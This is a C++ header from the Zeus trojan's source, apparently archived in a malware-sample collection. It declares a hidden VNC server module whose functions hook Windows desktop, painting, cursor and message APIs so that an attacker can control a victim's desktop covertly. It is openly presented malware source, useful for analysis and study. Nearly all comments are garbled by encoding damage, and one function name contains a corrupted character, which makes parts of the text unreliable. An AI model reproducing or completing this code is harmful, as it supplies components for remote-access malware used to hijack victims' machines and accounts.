/*
  name      Zeus
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
/*
  �������� � ���������� ��������� ��� ���������� ������� �� ��������� RFB.
*/
#pragma once

#if(BO_VNC > 0)
namespace VncServer
{
  /*
    �������������.
  */
  void init(void);

  /*
    ���������������.
  */
  void uninit(void);

  /*
    �������� ������.

    IN s   - ����� �������.
    
    Return - true - � ������ �������� ������,
             false - � ������ ������.
  */
  bool start(SOCKET s);

  /*
    ������ ����� ��������� ����.

    Return - true - � ������ ������,
             false - � ������ ������.
  */
  bool startAsPaintThread(void);

  /*
    ����������� OpenInputDesktop.
  */
  HDESK WINAPI hookerOpenInputDesktop(DWORD flags, BOOL inherit, ACCESS_MASK desiredAccess);

  /*
    ����������� SwitchDesktop.
  */
  BOOL WINAPI hookerSwitchDesktop(HDESK desktop);

  /*
    ����������� DefWindowProcW.
  */
  LRESULT WINAPI hookerDefWindowProcW(HWND window, UINT msg, WPARAM wParam, LPARAM lParam);

  /*
    ����������� DefWindowProcA.
  */
  LRESULT WINAPI hookerDefWindowProcA(HWND window, UINT msg, WPARAM wParam, LPARAM lParam);

  /*
    ����������� DefDlgProcW.
  */
  LRESULT WINAPI hookerDefDlgProcW(HWND window, UINT msg, WPARAM wParam, LPARAM lParam);

  /*
    ����������� DefDlgProcA.
  */
  LRESULT WINAPI hookerDefDlgProcA(HWND window, UINT msg, WPARAM wParam, LPARAM lParam);

  /*
    ����������� DefFrameProcW.
  */
  LRESULT WINAPI hookerDefFrameProcW(HWND frame, HWND client, UINT msg, WPARAM wParam, LPARAM lParam);
  
  /*
    ����������� DefFrameProcA.
  */
  LRESULT WINAPI hookerDefFrameProcA(HWND frame, HWND client, UINT msg, WPARAM wParam, LPARAM lParam);

  /*
    ����������� DefMDIChildProcW.
  */
  LRESULT WINAPI hookerDefMDIChildProcW(HWND window, UINT msg, WPARAM wParam, LPARAM lParam);

  /*
    ����������� DefMDIChildProcA.
  */
  LRESULT WINAPI hookerDefMDIChildProcA(HWND window, UINT msg, WPARAM wParam, LPARAM lParam);  
    
  /*
    ����������� CallWindowProcW.
  */
  LRESULT WINAPI hookerCallWindowProcW(WNDPROC prevWndFunc, HWND window, UINT msg, WPARAM wParam, LPARAM lParam);

  /*
    ����������� CallWindowProcW.
  */
  LRESULT WINAPI hookerCallWindowProcA(WNDPROC prevWndFunc, HWND window, UINT msg, WPARAM wParam, LPARAM lParam);

  /*
    ����������� RegisterClassW.
  */
  ATOM WINAPI hookerRegisterClassW(WNDCLASSW *wndClass);
  
  /*
    ����������� RegisterClassA.
  */
  ATOM WINAPI hookerRegisterClassA(WNDCLASSA *wndClass);

  /*
    ����������� RegisterClassExW.
  */
  ATOM WINAPI hookerRegisterClassExW(WNDCLASSEXW *wndClass);

  /*
    ����������� RegisterClassExA.
  */
  ATOM WINAPI hookerRegisterClassExA(WNDCLASSEXA *wndClass);

  /*
    ����������� BeginPaint.
  */
  HDC WINAPI hookerBeginPaint(HWND window, LPPAINTSTRUCT paint);
  
  /*
    ����������� EndPaint.
  */
  BOOL WINAPI hookerEndPaint(HWND window, const PAINTSTRUCT *paint);
  
  /*
    ����������� GetDCEx.
  */
  HDC WINAPI hookerGetDcEx(HWND window, HRGN clip, DWORD flags);
  
  /*
    ����������� GetDC.
  */
  HDC WINAPI hookerGetDc(HWND window);

  /*
    ����������� GetWindowDC.
  */
  HDC WINAPI hookerGetWindowDc(HWND window);

  /*
    ����������� ReleaseDC.
  */
  int WINAPI hookerReleaseD�(HWND window, HDC dc);

  /*
    ����������� GetUpdateRect.
  */
  BOOL WINAPI hookerGetUpdateRect(HWND window, LPRECT rect, BOOL erase);
  
  /*
    ����������� GetUpdateRgn.
  */
  int WINAPI hookerGetUpdateRgn(HWND window, HRGN rgn, BOOL erase);

  /*
    ����������� GetMessagePos.
  */
  DWORD WINAPI hookerGetMessagePos(void);
  
  /*
    ����������� GetCursorPos.
  */
  BOOL WINAPI hookerGetCursorPos(LPPOINT point);

  /*
    ����������� SetCursorPos.
  */
  BOOL WINAPI hookerSetCursorPos(int x, int y);

  /*
    ����������� SetCapture.
  */
  HWND WINAPI hookerSetCapture(HWND window);

  /*
    ����������� ReleaseCapture.
  */
  BOOL WINAPI hookerReleaseCapture(void);

  /*
    ����������� GetCapture.
  */
  HWND WINAPI hookerGetCapture(void);

  /*
    ����������� GetMessageW.
  */
  BOOL WINAPI hookerGetMessageW(LPMSG msg, HWND window, UINT msgFilterMin, UINT msgFilterMax);

  /*
    ����������� GetMessageA.
  */
  BOOL WINAPI hookerGetMessageA(LPMSG msg, HWND window, UINT msgFilterMin, UINT msgFilterMax);

  /*
    ����������� PeekMessageW.
  */
  BOOL WINAPI hookerPeekMessageW(LPMSG msg, HWND window, UINT msgFilterMin, UINT msgFilterMax, UINT removeMsg);

  /*    Interceptor PeekMessageA.
  */
  BOOL WINAPI hookerPeekMessageA(LPMSG msg, HWND window, UINT msgFilterMin, UINT msgFilterMax, UINT removeMsg);
};
#endif
